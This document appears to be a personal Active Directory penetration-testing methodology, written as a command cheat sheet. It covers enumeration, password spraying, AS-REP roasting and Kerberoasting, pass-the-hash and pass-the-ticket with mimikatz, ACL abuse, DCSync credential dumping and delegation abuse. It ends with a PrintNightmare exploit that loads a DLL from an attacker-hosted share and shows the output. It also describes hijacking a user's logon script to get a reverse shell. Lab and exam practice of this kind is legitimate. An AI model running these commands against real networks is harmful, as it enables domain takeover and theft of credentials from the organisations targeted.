# AD Methodology

For AD, this is the workflow to follow. At the start, we know nothing of the domain and have no usernames or anything regarding it. If I fall short on my own methodology, I use the Resources at the bottom of the page. I should note it's not possible to contain every single technique in a single checklist!

Here's a useful map of AD.

{% embed url="https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png" %}

## Enumeration

#### Nmap scan:

```bash
nmap -p- --min-rate 10000 <IP>
sudo nmap -p <PORTS> -sC -sV -O -T4 <IP>
```

#### Enumeration of SMB:

```bash
enum4linux -a <IP>
enum4linux -a -u 'guest' -p '' <IP>
```

#### Enumeration of share permissions:

```bash
smbmap -H <IP>
```

#### Connection to shares:

```bash
smbclient //<IP>/<sharename> -N
smbclient //<IP>/<sharename> -U guest
```

#### Enumerate LDAP with Null Credentials:

```bash
nmap -n -sV --script "ldap* and not brute" <IP>
```

#### Probing LDAP Further:

```bash
ldapsearch -x -h <IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
```

#### Responder for poisoning or MITM:

```bash
sudo responder -I tun0
```

**Once we have usernames but no passwords:**

* AS-REP Roasting
* Password Spray with crackmapexec.

#### AS-REP Roasting and Cracking:

{% code overflow="wrap" %}
```bash
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast

Get-DomainUser -PreauthNotRequired -verbose #for powerview

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast #crack hash
```
{% endcode %}

#### Password Spraying:

```bash
crackmapexec smb/ldap/winrm -u users.txt -p <password> <IP>
```

Apart from these steps, check for web vulnerabilities and Windows SMB related exploits such as EternalBlue or something.

Once we have access to this, we can either:

* Regular Windows PE
* AD-related PE.

Generally, once I complete all of these AD-related Enumerations, I should have gotten access. Otherwise, I would refer to other checklists and begin again.

## **Privilege Escalation**

* Attempt Bloodhound
* Check kerberos tickets in memory.
  * Kerberoast and crack the passwords
  * Else, we can pass the ticket/hash to authenticate to other users.
* Dump and pass hashes for remote authentication or to request more tickets.
  * Password spraying of all the hashes we find.
* Pass the ticket for authentication.
* Check AS-REP vulnerabilities for users in domain on DC or other clients.
* Unconstrained delegation
* Constrained Delegation
* ACL Abuse:
  * GPO Abuse
  * ACL Misconfiguration
  * DCSync
* PrintSpooler

#### Enumeration of other hosts:

```powershell
Get-DomainComputer | % {Resolve-DnsName $_.cn | Select Name, IPAddress}
```

#### Bloodhound:

```powershell
bloodhound-python -u <username> -p <password> -dc <IP_DC> -c all # for bash

. .\SharpHound.ps1
Invoke-BloodHound --CollectionMethod all

.\SharpHound.exe -c all
```

Find out possible vectors from this and see what we can do with it.

#### Kerberos Tickets Cached:

{% code overflow="wrap" %}
```powershell
klist

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName"
```
{% endcode %}

#### Check User SPNs for Kerberoast (require credentials):

{% code overflow="wrap" %}
```bash
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted

GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast

Get-NetUser -SPN | select serviceprincipalname #PowerView

Invoke-Mimikatz -Command '"kerberos::list /export"' #PowerView

impacket-GetUserSPNs -request -dc-ip <IP> -outputfile hashes 
```
{% endcode %}

#### Cracking tickets:

```bash
john --format=krb5tgs --wordlist=rockyou.txt hashes.kerberoast
```

#### Overpass The Hash:

```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7

export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache

python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```

#### Pass The Ticket:

```bash
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi" 

OR 

.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist 

.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd

OR
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
psexec.py domain/user@domain.com -k -no-pass
```

#### Unconstrained Delegation:

```bash
Get-NetComputer -Unconstrained #PowerView

.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "kerberos::list /export"
```

#### Constrained Delegation:

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth #powerview!
```

Check if any users are within this that would allow for it.

#### Check ACLs

{% code overflow="wrap" %}
```powershell
Get-ObjectAcl -SamAccountName username -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
#PowerView

#Bloodhound does this for you, the only downside to bloodhound is the fact that sometimes the collectors and version are incompatible, which is easily fixed by using Bloodhound from an older version. Just make sure the version matches.
```
{% endcode %}

#### GenericAll on User:

```powershell
net user <username> <password> /domain
```

#### GenericAll on Group:

{% code overflow="wrap" %}
```powershell
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential ('domain\user', $SecPassword)

Import-Module .\PowerView.ps1

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "<group name>" -PrincipalIdentity "<domain\user we want to add>"

Add-DomainGroupMember -Identity '<group name>' -Members "<domain\user we want to add>" -Credential $Cred
```
{% endcode %}

#### GenericAll on Group w/o Powerview:

{% code overflow="wrap" %}
```powershell
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
{% endcode %}

#### WriteProperty on Group:

{% code overflow="wrap" %}
```powershell
net user <user> /domain; Add-NetGroupUser -UserName <username> -GroupName "<group name>" -Domain "domain.com"
```
{% endcode %}

#### Self-Membership on Group:

```powershell
Add-NetGroupUser -UserName <username> -GroupName "<group name>" -Domain 
```

#### ForceChangePassword:

```
Set-DomainUserPassword -Identity <username> -Verbose
```

{% code overflow="wrap" %}
```powershell
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose

OR 

Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
{% endcode %}

#### WriteOwner on Group:

{% code overflow="wrap" %}
```powershell
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```
{% endcode %}

#### GenericWrite on User:

{% code overflow="wrap" %}
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
{% endcode %}

This would change the script that loads everytime the user logs on, hence we can use this to get a reverse shell or capture NTLM hashes.

#### WriteDACL + WriteOwner:

{% code overflow="wrap" %}
```powershell
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
{% endcode %}

#### Remote Powershelling with Creds:

{% code overflow="wrap" %}
```powershell
#Predefine necessary information

$Username = "YOURDOMAIN\username"

$Password = "password"

$ComputerName = "server"

$Script = {notepad.exe}

#Create credential object

$SecurePassWord = ConvertTo-SecureString -AsPlainText $Password -Force

$Cred = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $Username, $SecurePassWord

#Create session object with this

$Session = New-PSSession -ComputerName $ComputerName -credential $Cred

# Enter-PSSession

#Invoke-Command

$job = invoke-command -session $session -scriptblock $script

echo $job

#Close Session

Remove-PSSession -Session $Session
```
{% endcode %}

#### GPO Enumeration:

{% code overflow="wrap" %}
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "domain\username"} #PowerView
```
{% endcode %}

#### DCSync:

{% code overflow="wrap" %}
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
#PowerView Enumeration

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
#Local Exploitation

secretsdump.py -just-dc <user>:<password>@<ipaddress>
#remote Exploitation
```
{% endcode %}

#### PrintSpooler services:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
#Get-SpoolStatus.ps1 usage

rpcdump.py domain/user:password@server.com | greo MS-RPRN
#dump hashes and stuff
```

In certain cases, we are able to use unconstrained delegation with this by requesting tickets to make the printer authenticate against this computer. The TGT of the computer account of the printer will be saved in the memory of the computer with unconstrained delegation.

#### ReadLAPSPassword:

```bash
crackmapexec ldap 10.129.133.138 -u JDGodd -p 'JDg0dd1s@d0p3cr3@t0r' --module laps
```

AzureAD Connect Abuse: https://blog.xpnsec.com/azuread-connect-for-redteam/

Head to this blog and use the PoC script.

**Delegation** Delegation in short, is giving others the authority or privilege to execute actions on the behalf of another user. There are 3 types of Delegation:

* Unconstrained
* Constrained
* Resourced-based constrained Delegation

#### Enumeration:

{% code overflow="wrap" %}
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
```
{% endcode %}

#### Identify the accounts that allow for this. Export tickets:

```powershell
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```

#### Impersonate User with PTT:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TIcket.kirbi"'
```

#### Remote PS:

```powershell
$session = New-PSSession -Computer ComputerNAME
Invoke-Command -ScriptBlock{whoami;hostname} -computername COMPUTERNAME
```

Simple as that. For more advanced techniques, we can view this link:&#x20;

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation" %}

#### When stuck:

{% code overflow="wrap" %}
```powershell
netstat -a -b 
netstat -ano

#check and see what other things are running on the machine to see if another user is running them

procdump.exe <process> 

#sometimes credentials to certain users are in plaintext.
```
{% endcode %}

#### PrintNightMare:

{% code overflow="wrap" %}
```bash
git clone https://github.com/cube0x0/CVE-2021-1675
cd CVE-2021-1675/

python3 CVE-2021-1675.py 'HEIST/hazard:stealth1agent@10.10.10.149' '\\10.10.14.200\share\AddUserDll.dll'
[*] Connecting to ncacn_np:10.10.10.149[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \\10.10.14.200\share\AddUserDll.dll
[*] Try 1...
[*] Stage0: 0
[*] Stage2: 0
[+] Exploit Completed

RunasCs.exe to run code as new Administrator
```
{% endcode %}

## Other Resources

{% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#powershell-remoting" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" %}